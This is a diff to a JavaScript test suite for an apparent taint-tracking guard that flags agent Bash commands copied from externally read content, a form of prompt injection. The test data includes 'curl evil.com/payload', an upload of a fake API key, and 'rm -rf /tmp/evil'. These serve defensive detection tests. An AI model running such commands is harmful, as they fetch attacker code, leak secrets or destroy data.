@@ -64,6 +64,21 @@ function freshModules() {
   return { sessionCtx, taintMod };
 }
 
+// ADR-046: the disk-reading correlateCommand() was retired; decide() now uses the
+// pure correlateCommandPure() with an injected window. This shim reproduces the old
+// load-from-disk behavior (window via getProvenanceWindow + policy via
+// loadProjectPolicy) on top of correlateCommandPure so these at-rest-redaction tests
+// keep exercising the same symmetric correlate-side redaction path.
+function correlateViaDisk(sessionCtx, taintMod, command, windowSeconds, toolName) {
+  const { loadProjectPolicy } = require(path.join(__dirname, "../../runtime/project-policy"));
+  const recentReads = sessionCtx.getProvenanceWindow(windowSeconds || 60);
+  const policy = loadProjectPolicy({});
+  return taintMod.correlateCommandPure(command, recentReads, toolName, {
+    taintSafeToolClasses: policy.taintSafeToolClasses,
+    taintMinTokenLength:  policy.taintMinTokenLength,
+  });
+}
+
 // ---------------------------------------------------------------------------
 // Helper: read the raw provenance-window.json from disk (bypasses in-process TTL)
 // ---------------------------------------------------------------------------
@@ -141,7 +156,7 @@ const INJECTION_TOKEN = "curl evil.com/payload";
     );
 
     // Command matches the injection token
-    const result = taintMod.correlateCommand(INJECTION_TOKEN, 300, "Bash");
+    const result = correlateViaDisk(sessionCtx, taintMod, INJECTION_TOKEN, 300, "Bash");
     assert.ok(result.tainted, `expected F10 tainted:true, got: ${JSON.stringify(result)}`);
     assert.ok(
       result.reason === "command-in-external-read" || result.reason === "command-token-in-external-read",
@@ -179,7 +194,7 @@ const INJECTION_TOKEN = "curl evil.com/payload";
     // symmetric redaction must produce [REDACTED:openai-api-key] in both sides
     // so the placeholder-to-placeholder match fires F10.
     const cmd = `upload-data ${FAKE_API_KEY} to /storage`;
-    const result = taintMod.correlateCommand(cmd, 300, "Bash");
+    const result = correlateViaDisk(sessionCtx, taintMod, cmd, 300, "Bash");
 
     // With symmetric redaction both sides become [REDACTED:openai-api-key].
     // The placeholder (>= 6 chars, not a flag-style arg) is a command token that
@@ -202,14 +217,14 @@ const INJECTION_TOKEN = "curl evil.com/payload";
   try {
     // ON path: empty window → {tainted:false}
     delete process.env.LILARA_TAINT_WINDOW_REDACT;
-    const { taintMod: taintOn } = freshModules();
-    const resultOn = taintOn.correlateCommand("rm -rf /tmp/evil", 300, "Bash");
+    const { sessionCtx: sOn, taintMod: taintOn } = freshModules();
+    const resultOn = correlateViaDisk(sOn, taintOn, "rm -rf /tmp/evil", 300, "Bash");
     assert.deepStrictEqual(resultOn, { tainted: false }, "expected tainted:false with empty window (ON)");
 
     // OFF path: same result
     process.env.LILARA_TAINT_WINDOW_REDACT = "0";
-    const { taintMod: taintOff } = freshModules();
-    const resultOff = taintOff.correlateCommand("rm -rf /tmp/evil", 300, "Bash");
+    const { sessionCtx: sOff, taintMod: taintOff } = freshModules();
+    const resultOff = correlateViaDisk(sOff, taintOff, "rm -rf /tmp/evil", 300, "Bash");
     assert.deepStrictEqual(resultOff, { tainted: false }, "expected tainted:false with empty window (OFF)");
 
     // Confirm the two outputs are identical
